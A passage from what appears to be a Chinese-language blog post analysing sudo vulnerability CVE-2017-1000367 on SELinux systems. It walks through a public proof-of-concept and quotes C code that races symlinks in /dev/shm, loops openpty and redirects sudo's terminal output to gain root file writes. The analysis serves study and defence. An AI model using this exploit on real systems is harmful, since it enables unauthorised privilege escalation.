class="hljs-string">&quot;/dev/stderr&quot;</span>,</span><br></pre></td></tr></tbody></table></figure><br>&#x8FD9;&#x5C31;&#x548C;&#x540E;&#x9762;&#x7684;&#x5229;&#x7528;&#x6709;&#x5173;&#x7CFB;&#x4E86;&#xFF0C;&#x83B7;&#x53D6;&#x8BBE;&#x5907;&#x53F7;&#x540E;&#x5904;&#x7406;&#x6D41;&#x7A0B;&#xFF0C;&#x5F53;&#x83B7;&#x53D6;&#x5230;&#x4E00;&#x4E2A;&#x4E0D;&#x4E3A;0&#x7684;&#x8BBE;&#x5907;&#x53F7;&#x540E;&#xFF0C;&#x5373;&#x8BA4;&#x4E3A;&#x662F;&#x5B58;&#x5728;tty&#x8BBE;&#x5907;&#x7684;&#xFF0C;&#x6B64;&#x65F6;&#x5C06;&#x8C03;&#x7528;sudo_ttyname_dev&#x51FD;&#x6570;&#x4F9D;&#x636E;&#x8BBE;&#x5907;&#x53F7;&#x53BB;&#x641C;&#x7D22;&#x6307;&#x5B9A;&#x7684;&#x8BBE;&#x5907;&#x540D;&#x3002;&#x641C;&#x7D22;&#x987A;&#x5E8F;&#x662F;&#x9996;&#x5148;&#x5728;search_devs&#x6570;&#x7EC4;&#x4E2D;&#x5305;&#x542B;&#x7684;&#x8DEF;&#x5F84;&#x4E0B;&#x641C;&#x7D22;&#xFF0C;&#x82E5;&#x4E0D;&#x5B58;&#x5728;&#xFF0C;&#x5C06;&#x5728;/dev&#x8DEF;&#x5F84;&#x4E0B;&#x8FDB;&#x884C;&#x5E7F;&#x5EA6;&#x4F18;&#x5148;&#x641C;&#x7D22;&#x3002;&#x8BE6;&#x7EC6;&#x53EF;&#x89C1;&#xFF1A;<a href="https://github.com/Distrotech/sudo/blob/master/src/ttyname.c" target="_blank" rel="noopener">https://github.com/Distrotech/sudo/blob/master/src/ttyname.c</a> &#x7684;sudo_ttyname_dev(dev_t rdev)&#x51FD;&#x6570;&#xFF0C;&#x4EE3;&#x7801;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#x3002;<p></p><p>&#x6211;&#x5728;centos 7&#x4E0A;&#x67E5;&#x770B;&#x4E86;dev&#x6587;&#x4EF6;&#x5939;&#x4E0B;&#x7684;&#x6743;&#x9650;&#x60C5;&#x51B5;&#x3002;<br></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost dev]<span class="hljs-comment"># ls -ld</span></span><br><span class="line">drwxr-xr-x. 20 root root 3280 Jun  5 02:14 .</span><br><span class="line"></span><br><span class="line">[root@localhost dev]<span class="hljs-comment"># ls -ld shm/</span></span><br><span class="line">drwxrwxrwt. 2 root root 180 Jun  5 04:30 shm/</span><br><span class="line"></span><br><span class="line">[root@localhost dev]<span class="hljs-comment"># ls -ld mqueue/</span></span><br><span class="line">drwxrwxrwt. 2 root root 40 Jun  5  2017 mqueue/</span><br></pre></td></tr></tbody></table></figure><br>&#x5176;&#x4E2D; shm&#x548C;mqueue&#x6587;&#x4EF6;&#x5939;&#x662F;&#x666E;&#x901A;&#x7528;&#x6237;&#x53EF;&#x5199;&#xFF0C;&#x90A3;&#x4E48;&#x4E5F;&#x5C31;&#x610F;&#x5473;&#x7740;&#x5F53;&#x6211;&#x4EEC;&#x8BBE;&#x7F6E;&#x4E3A;&#x4E00;&#x4E2A;&#x4E0D;&#x5B58;&#x5728;&#x7684;tty&#x8BBE;&#x5907;&#x53F7;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x901A;&#x8FC7;&#x5BF9;/dev&#x6587;&#x4EF6;&#x5939;&#x8FDB;&#x884C;&#x641C;&#x7D22;&#x65F6;&#xFF0C;&#x80FD;&#x591F;&#x89E6;&#x78B0;&#x5230;&#x6211;&#x4EEC;&#x81EA;&#x5DF1;&#x521B;&#x5EFA;&#x7684;&#x6587;&#x4EF6;&#x3002;<br>&#x6240;&#x4EE5;&#x7B2C;&#x4E8C;&#x4E2A;&#x4FEE;&#x8865;&#x4F4D;&#x7F6E;&#x5C31;&#x662F;&#x6DFB;&#x52A0;&#x4E86;&#x4E24;&#x4E2A;&#x5FFD;&#x89C6;&#x641C;&#x7D22;&#x7684;&#x8DEF;&#x5F84;&#xFF0C;&#x5373;shm&#x548C;mqueue&#x6587;&#x4EF6;&#x5939;&#x4E0D;&#x653E;&#x7F6E;&#x5728;&#x641C;&#x7D22;&#x8DEF;&#x5F84;&#x4E0B;&#x3002;<p></p><h3 id="&#x6F0F;&#x6D1E;&#x5F71;&#x54CD;&#x548C;&#x590D;&#x73B0;"><a href="#&#x6F0F;&#x6D1E;&#x5F71;&#x54CD;&#x548C;&#x590D;&#x73B0;" class="headerlink" title="&#x6F0F;&#x6D1E;&#x5F71;&#x54CD;&#x548C;&#x590D;&#x73B0;"></a>&#x6F0F;&#x6D1E;&#x5F71;&#x54CD;&#x548C;&#x590D;&#x73B0;</h3><p>freebuf&#x4E0A;&#x7ED9;&#x7684;&#x6807;&#x9898;&#x4E3A;<br>SELinux&#x66DD;&#x65B0;&#x5B89;&#x5168;&#x6F0F;&#x6D1E;&#xFF1A;&#x7528;&#x6237;&#x6267;&#x884C;sudo&#x547D;&#x4EE4;&#x53EF;&#x83B7;&#x53D6;root&#x6743;&#x9650;<br>&#x5176;&#x5B9E;&#x5F88;&#x591A;&#x65F6;&#x5019;&#x4E0D;&#x662F;&#x5F88;&#x660E;&#x786E;sudo&#x548C;root&#x4E4B;&#x95F4;&#x7684;&#x533A;&#x522B;&#xFF0C;&#x5C24;&#x5176;&#x662F;&#x5728;ubuntu&#x4E0A;&#x9ED8;&#x8BA4;&#x7528;&#x6237;&#x5B89;&#x88C5;&#x7684;&#x65F6;&#x5019;&#xFF0C;sudo&#x4E4B;&#x540E;&#x7684;&#x7528;&#x6237;&#x57FA;&#x672C;&#x4E0A;&#x548C;root&#x662F;&#x4E00;&#x4E2A;&#x6743;&#x9650;&#x3002;<br>&#x4F46;&#x662F;&#x5728;&#x5305;&#x542B;SELinux&#x7684;Linux&#x7CFB;&#x7EDF;&#x4E2D;&#xFF0C;sudo&#x83B7;&#x53D6;&#x7684;&#x6743;&#x9650;&#x548C;root&#x7684;&#x5DEE;&#x5F02;&#x5F88;&#x660E;&#x663E;&#xFF0C;&#x5C24;&#x5176;&#x662F;&#x5728;&#x4F7F;&#x7528;centos&#x7684;&#x65F6;&#x5019;&#x5DEE;&#x5F02;&#x5F88;&#x660E;&#x663E;&#x3002;<br>&#x8BE6;&#x7EC6;&#x53EF;&#x4EE5;&#x53C2;&#x8003;&#xFF1A;<a href="http://www.jb51.net/LINUXjishu/12713.html" target="_blank" rel="noopener">http://www.jb51.net/LINUXjishu/12713.html</a><br>&#x7B80;&#x5355;&#x63CF;&#x8FF0;&#x4E3A;&#xFF0C;&#x666E;&#x901A;&#x7528;&#x6237;&#x4F7F;&#x7528;sudo&#x6267;&#x884C;&#x547D;&#x4EE4;&#x6D41;&#x7A0B;&#x662F;&#x5F53;&#x524D;&#x7528;&#x6237;&#x5207;&#x6362;&#x5230;root&#xFF0C;&#x7136;&#x540E;&#x4EE5;root&#x7684;&#x8EAB;&#x4EFD;&#x6267;&#x884C;&#x547D;&#x4EE4;&#xFF0C;&#x6267;&#x884C;&#x5B8C;&#x6210;&#x540E;&#x518D;&#x6B21;&#x56DE;&#x5230;&#x5F53;&#x524D;&#x7528;&#x6237;&#x3002;<br>&#x6743;&#x9650;&#x95EE;&#x9898;&#xFF1A;&#x666E;&#x901A;&#x7528;&#x6237;&#x7684;sudo&#x6743;&#x9650;&#x662F;root&#x7ED9;&#x5B9A;&#x7684;&#xFF0C;root&#x51B3;&#x5B9A;&#x666E;&#x901A;&#x7528;&#x6237;&#x80FD;&#x591F;&#x4F7F;&#x7528;sudo&#x6267;&#x884C;&#x54EA;&#x4E9B;&#x64CD;&#x4F5C;&#x3002;&#x5177;&#x4F53;&#x7684;&#x8BBE;&#x7F6E;&#x5728;/etc/sudoers&#x6587;&#x4EF6;&#x4E0B;&#xFF0C;&#x5982;&#x6DFB;&#x52A0;&#x4E00;&#x6761;<br></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">## Allows members of the users group to shutdown this system</span></span><br><span class="line"><span class="hljs-comment"># %users  localhost=/sbin/shutdown -h now</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">## Read drop-in files from /etc/sudoers.d (the # here does not mean a comment)</span></span><br><span class="line"><span class="hljs-comment">#includedir /etc/sudoers.d</span></span><br><span class="line">centos ALL=(ALL) NOPASSWD: /usr/bin/sum</span><br></pre></td></tr></tbody></table></figure><br>&#x90A3;&#x4E48;centos&#x7528;&#x6237;&#x80FD;&#x591F;&#x6267;&#x884C;sudo&#xFF0C;&#x4F46;&#x662F;&#x53EA;&#x80FD;&#x6267;&#x884C;sum&#x547D;&#x4EE4;<br><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[centos@localhost ~]$ sudo vim /etc/passwd</span><br><span class="line">[sudo] password <span class="hljs-keyword">for</span> centos: </span><br><span class="line">Sorry, user centos is not allowed to execute <span class="hljs-string">&apos;/bin/vim /etc/passwd&apos;</span> as root on localhost.localdomain.</span><br><span class="line">[centos@localhost ~]$ sudo sum /etc/passwd</span><br><span class="line">11634     3</span><br><span class="line">[centos@localhost ~]$</span><br></pre></td></tr></tbody></table></figure><br>&#x5E9F;&#x8BDD;&#x5C11;&#x8BF4;&#x4E86;&#xFF0C;&#x5165;&#x6B63;&#x9898;&#xFF1A;&#x6F0F;&#x6D1E;&#x6548;&#x679C;&#x600E;&#x6837;&#xFF1F;<br>&#x56E0;&#x4E3A;&#x662F;&#x901A;&#x8FC7;sudo&#x547D;&#x4EE4;&#x5BF9;get_process_ttyname&#x51FD;&#x6570;&#x6267;&#x884C;&#x7684;&#xFF0C;&#x56E0;&#x6B64;&#x5229;&#x7528;&#x8BE5;&#x6F0F;&#x6D1E;&#x524D;&#x63D0;&#x662F;&#x80FD;&#x591F;&#x62FF;&#x5230;&#x4E00;&#x4E2A;&#x7528;&#x6237;&#x7684;sudo&#x6743;&#x9650;&#xFF0C;&#x800C;&#x5728;&#x4F7F;&#x7528;&#x4E86;SELinux&#x7684;&#x7CFB;&#x7EDF;&#x4E2D;&#xFF0C;&#x4F1A;&#x5C06;&#x6807;&#x51C6;&#x8F93;&#x5165;&#x8F93;&#x51FA;(stdout, stderr, stdin)&#x4FE1;&#x606F;&#x5199;&#x5165;&#x5230;&#x6587;&#x4EF6;&#x4E4B;&#x4E2D;&#xFF0C;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x662F;&#x5F53;&#x524D;&#x8FDB;&#x7A0B;&#x6240;&#x5BF9;&#x5E94;&#x7684;&#x865A;&#x62DF;&#x7EC8;&#x7AEF;&#x7684;&#x6587;&#x4EF6;&#x3002;&#xFF08;&#x4F7F;&#x7528;sudo -r unconfined_r&#x80FD;&#x591F;&#x89E6;&#x53D1;&#xFF09;&#xFF08;&#x8FD9;&#x91CC;&#x56E0;&#x4E3A;&#x4E0D;&#x662F;&#x5F88;&#x4E86;&#x89E3;&#xFF0C;&#x63CF;&#x8FF0;&#x6BD4;&#x8F83;&#x6A21;&#x7CCA;&#xFF0C;&#x8BE6;&#x7EC6;&#x53EF;&#x53C2;&#x8003;SELinux&#x7684;&#x4E00;&#x4E9B;&#x5904;&#x7406;&#xFF09;&#x3002;<br>&#x56E0;&#x6B64;&#x5F53;&#x6211;&#x4EEC;&#x80FD;&#x591F;&#x63A7;&#x5236;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#xFF0C;&#x5C31;&#x80FD;&#x591F;&#x63A7;&#x5236;&#x5BF9;&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x7684;&#x5199;&#x5165;&#xFF0C;&#x56E0;&#x4E3A;&#x8FD9;&#x4E2A;&#x5199;&#x5165;&#x64CD;&#x4F5C;&#x4E5F;&#x662F;&#x5728;root&#x6743;&#x9650;&#x4E0B;&#xFF0C;&#x6240;&#x4EE5;&#x80FD;&#x591F;&#x5BF9;&#x654F;&#x611F;&#x6587;&#x4EF6;&#x5199;&#x5165;&#xFF0C;&#x5982;/etc/sudoers&#x3002;<br>&#x6240;&#x4EE5;&#x8BE5;&#x6F0F;&#x6D1E;&#x7684;&#x5229;&#x7528;&#x6548;&#x679C;&#x4E3A;&#xFF0C;&#x80FD;&#x591F;&#x5C06;&#x4E00;&#x4E2A;&#x7528;&#x4E8E;sudo&#x6743;&#x9650;&#x7684;&#x7528;&#x6237;&#x63D0;&#x5347;&#x5230;root&#x6743;&#x9650;&#x3002;<br>&#x56E0;&#x4E3A;github&#x627E;&#x5230;&#x4E86;PoC&#xFF0C;&#x80FD;&#x591F;&#x5B9E;&#x73B0;&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x7684;&#x5199;&#x5165;&#xFF0C;&#x5E76;&#x4E14;&#x4E5F;&#x6D4B;&#x8BD5;&#x6210;&#x529F;&#xFF0C;&#x56E0;&#x6B64;&#x5C06;&#x4F9D;&#x636E;&#x8BE5;PoC&#x6765;&#x4ECB;&#x7ECD;&#x4E0B;&#x5982;&#x4F55;&#x63D0;&#x6743;&#x3002;<br><a href="https://github.com/c0d3z3r0/sudo-CVE-2017-1000367/blob/master/sudopwn.c" target="_blank" rel="noopener">https://github.com/c0d3z3r0/sudo-CVE-2017-1000367/blob/master/sudopwn.c</a><br><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">mkdir</span>(<span class="hljs-string">&quot;/dev/shm/_tmp&quot;</span>, <span class="hljs-number">0755</span>);</span><br><span class="line">symlink(<span class="hljs-string">&quot;/dev/pts/57&quot;</span>, <span class="hljs-string">&quot;/dev/shm/_tmp/_tty&quot;</span>);</span><br><span class="line">symlink(<span class="hljs-string">&quot;/usr/bin/sudo&quot;</span>, <span class="hljs-string">&quot;/dev/shm/_tmp/     34873 &quot;</span>);</span><br><span class="line">[......]</span><br><span class="line">execlp(<span class="hljs-string">&quot;/dev/shm/_tmp/     34873 &quot;</span>, <span class="hljs-string">&quot;sudo&quot;</span>, <span class="hljs-string">&quot;-r&quot;</span>, <span class="hljs-string">&quot;unconfined_r&quot;</span>, <span class="hljs-string">&quot;/usr/bin/sum&quot;</span>, <span class="hljs-string">&quot;--\nHELLO\nWORLD\n&quot;</span>, <span class="hljs-literal">NULL</span>);</span><br></pre></td></tr></tbody></table></figure><br>&#x9996;&#x5148;&#x662F;&#x521B;&#x5EFA;&#x4E00;&#x4E0B;&#x7B26;&#x53F7;&#x94FE;&#x63A5;&#x4E86;&#xFF0C;&#x5148;&#x770B;&#x7B2C;&#x4E8C;&#x4E2A;&#xFF0C;&#x7B2C;&#x4E00;&#x4E2A;&#x7684;&#x4F5C;&#x7528;&#x5C06;&#x5728;&#x540E;&#x9762;&#x63CF;&#x8FF0;&#x3002;&#x56E0;&#x4E3A;&#x5C06;/dev/shm/_tmp/     34873 &#x94FE;&#x63A5;&#x5230;sudo&#x4E86;&#xFF0C;&#x6240;&#x4EE5;&#x6267;&#x884C;&#x5B83;&#x7684;&#x65F6;&#x5019;&#x4E5F;&#x4F1A;&#x8C03;&#x7528;&#x6F0F;&#x6D1E;&#x51FD;&#x6570;get_process_ttyname&#xFF0C;&#x4F7F;&#x7528;execlp&#x6267;&#x884C;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x80FD;&#x591F;&#x628A;&#x6211;&#x4EEC;&#x7684;34873&#x5199;&#x5165;&#x5230;&#x7B2C;&#x4E03;&#x9879;tty&#x8BBE;&#x5907;&#x53F7;&#x4E2D;&#x4E86;&#xFF0C;&#x4E0B;&#x6B21;&#x83B7;&#x53D6;&#x7684;&#x65F6;&#x5019;&#x5C31;&#x662F;&#x901A;&#x8FC7;34873&#x6765;&#x8C03;&#x7528;sudo_ttyname_dev&#x6765;&#x67E5;&#x8BE2;&#x4E86;&#xFF0C;&#x56E0;&#x4E3A;&#x8FD9;&#x4E2A;&#x662F;&#x6211;&#x4EEC;&#x5199;&#x5165;&#x7684;&#x4E00;&#x4E2A;&#x4E0D;&#x5B58;&#x5728;&#x7684;tty&#x8BBE;&#x5907;&#x53F7;&#xFF0C;&#x90A3;&#x4E48;&#x5728;search_devs[]&#x6570;&#x7EC4;&#x4E2D;&#x662F;&#x627E;&#x4E0D;&#x5230;&#x7684;&#xFF0C;&#x56E0;&#x6B64;&#x9700;&#x8981;&#x53BB;/dev&#x6587;&#x4EF6;&#x5939;&#x4E0B;&#x641C;&#x7D22;&#xFF0C;&#x6B64;&#x65F6;&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;&#x6D88;&#x606F;&#x53CD;&#x9988;&#xFF0C;&#x5F53;&#x641C;&#x7D22;&#x5230;&#x6211;&#x4EEC;&#x521B;&#x5EFA;&#x7684;&#x6587;&#x4EF6;&#x5939;/dev/shm/_tmp&#x7684;&#x65F6;&#x5019;&#x7ED9;&#x4E88;&#x6D88;&#x606F;&#xFF0C;&#x5373;<br><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wd = inotify_add_watch( fd, <span class="hljs-string">&quot;/dev/shm/_tmp&quot;</span>, IN_OPEN | IN_CLOSE_NOWRITE );</span><br></pre></td></tr></tbody></table></figure><br><del>~ &#x5F53;&#x63A5;&#x53D7;&#x5230;&#x6D88;&#x606F;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x6253;&#x5F00;&#x6587;&#x4EF6;&#x5939;&#xFF0C;&#x5C06;&#x5BF9;&#x91CC;&#x9762;&#x8FDB;&#x884C;&#x641C;&#x7D22;&#xFF0C;&#x90A3;&#x4E48;&#x5C06;&#x4F1A;&#x89E6;&#x53D1;&#x5230;&#x6211;&#x4EEC;&#x8BBE;&#x7F6E;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x7B26;&#x53F7;&#x94FE;&#x63A5;&#xFF0C;&#x94FE;&#x63A5;&#x5230;&#x201D;/dev/pts/57&#x201D;&#xFF0C;&#x8FD9;&#x4E2A;&#x4E5F;&#x662F;&#x4E0D;&#x5B58;&#x5728;&#xFF0C;&#x4F46;&#x662F;&#x7B26;&#x53F7;&#x94FE;&#x63A5;&#xFF0C;&#x7B49;&#x540C;&#x4E8E;Linux&#x4E0B;&#x7684;ld -s&#x547D;&#x4EE4;&#xFF0C;&#x94FE;&#x63A5;&#x53CC;&#x65B9;&#x53EA;&#x8981;&#x6709;&#x4E00;&#x4E2A;&#x53D8;&#x5316;&#xFF0C;&#x53E6;&#x4E00;&#x4E2A;&#x4E5F;&#x4F1A;&#x53D1;&#x751F;&#x53D8;&#x5316;&#xFF0C;&#x90A3;&#x4E48;&#x672C;&#x6765;&#x94FE;&#x63A5;&#x5230;&#x7A7A;&#xFF0C;&#x89E6;&#x53D1;&#x7B2C;&#x4E00;&#x4E2A;&#x7B26;&#x53F7;&#x94FE;&#x63A5;&#x65F6;&#x5C06;&#x521B;&#x5EFA;&#x201D;/dev/pts/57&#x201D;&#xFF08;&#x8FD9;&#x4E2A;&#x5728;centos&#x4E0B;&#x4F7F;&#x7528;ld -s&#x6D4B;&#x8BD5;&#x6210;&#x529F;&#xFF09;&#x3002;<br>&#x6B64;&#x65F6;&#x63A5;&#x7740;&#x662F;&#x4E00;&#x4E2A;&#x5FAA;&#x73AF;&#x6267;&#x884C;openpty&#xFF0C;&#x5C1D;&#x8BD5;&#x83B7;&#x53D6;&#x4E00;&#x4E2A;&#x53EF;&#x7528;&#x7684;&#x865A;&#x62DF;&#x7EC8;&#x7AEF;&#xFF0C;&#x5F53;&#x5176;&#x521B;&#x5EFA;&#x4E4B;&#x540E;&#xFF0C;&#x90A3;&#x4E48;&#x4E00;&#x5B9A;&#x80FD;&#x591F;&#x83B7;&#x53D6;&#x5230;&#xFF0C;&#x5E76;&#x7ED9;&#x5F53;&#x524D;&#x8FDB;&#x7A0B;&#x4F7F;&#x7528;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x524D;&#x9762;&#x63D0;&#x5230;&#x7684;SELinux &#x5C06;&#x4F1A;&#x5427;&#x6807;&#x51C6;&#x8F93;&#x5165;&#x8F93;&#x51FA;&#x5199;&#x5165;&#x5230;&#x8FD9;&#x91CC;&#x3002;&#x56E0;&#x6B64;&#x5728;&#x8BE5;&#x6587;&#x4EF6;&#x641C;&#x7D22;&#x7ED3;&#x675F;&#x4E4B;&#x540E;&#xFF0C;&#x89E6;&#x53D1;CLOSE&#xFF0C;&#x628A;&#x94FE;&#x63A5;&#x7684;&#x6587;&#x4EF6;&#x4FEE;&#x6539;&#x4E86;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x63A7;&#x5236;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x90A3;&#x4E48;&#x5F53;&#x6709;&#x6807;&#x51C6;&#x8F93;&#x5165;&#x8F93;&#x51FA;&#x7684;&#x65F6;&#x5019;&#x5C06;&#x4F1A;&#x8F93;&#x51FA;&#x5230;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x4E0B;&#x3002;</del> (&#x8FD9;&#x91CC;&#x63CF;&#x8FF0;&#x6709;&#x8BEF; &#x611F;&#x8C22;@XiaoHuaMe)<p></p><p>&#x5F53;&#x6253;&#x5F00;/dev/shm/_tmp &#x6587;&#x4EF6;&#x5939;&#x65F6;&#xFF0C;&#x89E6;&#x53D1;&#x6D88;&#x606F;&#xFF0C;&#x5C06;&#x8FDB;&#x5165;&#x7236;&#x8FDB;&#x7A0B;&#xFF0C;&#x5E76;&#x7EC8;&#x6B62;&#x5B50;&#x8FDB;&#x7A0B;&#xFF1B;&#x6B64;&#x65F6;&#x4F7F;&#x7528;openpty&#x5FAA;&#x73AF;&#x83B7;&#x53D6;&#x53EF;&#x7528;&#x7684;&#x865A;&#x62DF;&#x7EC8;&#x7AEF;&#x3002;&#x524D;&#x9762;&#x5BF9;&#x4E8E;openpty&#x7684;&#x7406;&#x89E3;&#x5B58;&#x5728;&#x9519;&#x8BEF;&#xFF0C;&#x5047;&#x8BBE;/dev/pts&#x76EE;&#x5F55;&#x4E0B;&#x53EA;&#x6709;0&#x548C;1&#xFF0C;&#x90A3;&#x4E48;&#x6B64;&#x65F6;&#x5E94;&#x8BE5;&#x90FD;&#x5728;&#x88AB;&#x5360;&#x7528;&#x72B6;&#x6001;&#xFF0C;&#x4E0B;&#x4E00;&#x4E2A;&#x53EF;&#x7528;&#x7684;&#x5C06;&#x4F1A;&#x662F;2&#xFF0C;&#x53EF;&#x4EE5;&#x5728;openpty&#x540E;&#x9762;&#x52A0;&#x4E00;&#x4E2A;while(1);&#x53D1;&#x73B0;&#x5728;/dev/pts&#x76EE;&#x5F55;&#x4E0B;&#x521B;&#x5EFA;&#x4E86;2&#xFF0C;&#x90A3;&#x4E48;&#x6B64;&#x65F6;&#x5C06;&#x8FDB;&#x5165;while&#x5FAA;&#x73AF;&#x3002;<br></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">while</span>(strcmp(pts_path,<span class="hljs-string">&quot;/dev/pts/57&quot;</span>)){</span><br><span class="line">openpty(&amp;master, &amp;slave, &amp;pts_path[0], NULL, NULL);</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><br>&#x7136;&#x540E;&#x4F1A;&#x7EE7;&#x7EED;&#x51FA;&#x73B0;3&#xFF0C;4&#xFF0C;&#x76F4;&#x5230;57&#x7684;&#x5B58;&#x5728;&#x3002;(58&#x662F;&#x56E0;&#x4E3A;&#x6211;&#x65B0;&#x5F00;&#x4E86;&#x4E00;&#x4E2A;&#x7EC8;&#x7AEF;&#x67E5;&#x770B;pts)<br><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[centos@localhost ~]$ ls /dev/pts/</span><br><span class="line">0   11  14  17  2   22  25  28  30  33  36  39  41  44  47  5   52  55  58  8</span><br><span class="line">1   12  15  18  20  23  26  29  31  34  37  4   42  45  48  50  53  56  6   9</span><br><span class="line">10  13  16  19  21  24  27  3   32  35  38  40  43  46  49  51  54  57  7   ptmx</span><br></pre></td></tr></tbody></table></figure><br>&#x8FD8;&#x6709;&#x53E6;&#x4E00;&#x4E2A;&#x70B9;&#xFF0C;device name&#x4E3A; 34873&#xFF0C;&#x90A3;&#x4E48;&#x9700;&#x8981;&#x67E5;&#x627E;&#x7684;pty&#x4E3A;57&#xFF08;&#x8FD9;&#x91CC;&#x5E76;&#x672A;&#x627E;&#x5230;&#x6743;&#x5A01;&#x7684;&#x8BF4;&#x660E;&#xFF0C;&#x671B;&#x5927;&#x5BB6;&#x6307;&#x6B63;^^&#xFF09;<br>&#x4F5C;&#x8005;&#x7684;&#x63CF;&#x8FF0;&#x5982;&#x4E0B;&#xFF1A;<br><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and a symlink <span class="hljs-string">&quot;/dev/shm/_tmp/_tty&quot;</span></span><br><span class="line">  to a non-existent pty <span class="hljs-string">&quot;/dev/pts/57&quot;</span>, whose device number is 34873;</span><br></pre></td></tr></tbody></table></figure><br>&#x6B64;&#x65F6;&#x5DF2;&#x7ECF;&#x521B;&#x5EFA;&#x4E86;57&#xFF0C;&#x90A3;&#x4E48;&#x5524;&#x9192;&#x5B50;&#x8FDB;&#x7A0B;&#xFF0C;&#x7EE7;&#x7EED;&#x641C;&#x7D22;&#xFF0C;&#x5C06;&#x6309;&#x7167;&#x7B26;&#x53F7;&#x94FE;&#x63A5;&#x627E;&#x5230;57&#xFF0C;&#x5E76;&#x8FD4;&#x56DE;&#x8BBE;&#x5907;&#x540D;&#x4E3A;&#x5BF9;&#x5E94;&#x7684;&#x7B26;&#x53F7;&#x94FE;&#x63A5;&#xFF08;/dev/shm/_tmp/_tty&#xFF09;&#x3002;<br>&#x6B64;&#x65F6;&#x518D;&#x4FEE;&#x6539;&#x7B26;&#x53F7;&#x94FE;&#x63A5;&#x6307;&#x5411;&#xFF0C;&#x800C;SELinux&#x5C06;&#x6309;&#x7167;&#x8FD9;&#x4E2A;&#x7B26;&#x53F7;&#x94FE;&#x63A5;&#x7684;&#x6307;&#x5411;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x6807;&#x51C6;&#x8F93;&#x5165;&#x8F93;&#x51FA;&#x7684;&#x5199;&#x5165;&#x3002;<p></p><p>&#x8FD9;&#x91CC;&#x5229;&#x7528;&#x7684;&#x662F;stderr&#xFF1B;&#x56E0;&#x6B64;&#x80FD;&#x591F;&#x8FBE;&#x5230;&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x5199;&#x5165;&#x3002;<br></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> ( event-&gt;mask &amp; IN_OPEN ) {</span><br><span class="line"><span class="hljs-comment">//kill(pid, SIGSTOP);</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">while</span>(<span class="hljs-built_in">strcmp</span>(pts_path,<span class="hljs-string">&quot;/dev/pts/57&quot;</span>)){</span><br><span class="line">openpty(&amp;master, &amp;slave, &amp;pts_path[<span class="hljs-number">0</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);</span><br><span class="line">};</span><br><span class="line"><span class="hljs-comment">//kill(pid, SIGCONT);</span></span><br><span class="line"><span class="hljs-keyword">break</span>;</span><br><span class="line"></span><br><span class="line">}<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( event-&gt;mask &amp; IN_CLOSE_NOWRITE ) {</span><br><span class="line"><span class="hljs-comment">//kill(pid, SIGSTOP);</span></span><br><span class="line"></span><br><span class="line">unlink(<span class="hljs-string">&quot;/dev/shm/_tmp/_tty&quot;</span>);</span><br><span class="line">symlink(<span class="hljs-string">&quot;/etc/motd&quot;</span>, <span class="hljs-string">&quot;/dev/shm/_tmp/_tty&quot;</span>);</span><br><span class="line"><span class="hljs-comment">//kill(pid, SIGCONT);</span></span><br><span class="line"></span><br><span class="line">state = <span class="hljs-number">1</span>;</span><br><span class="line"><span class="hljs-keyword">break</span>;</span><br><span 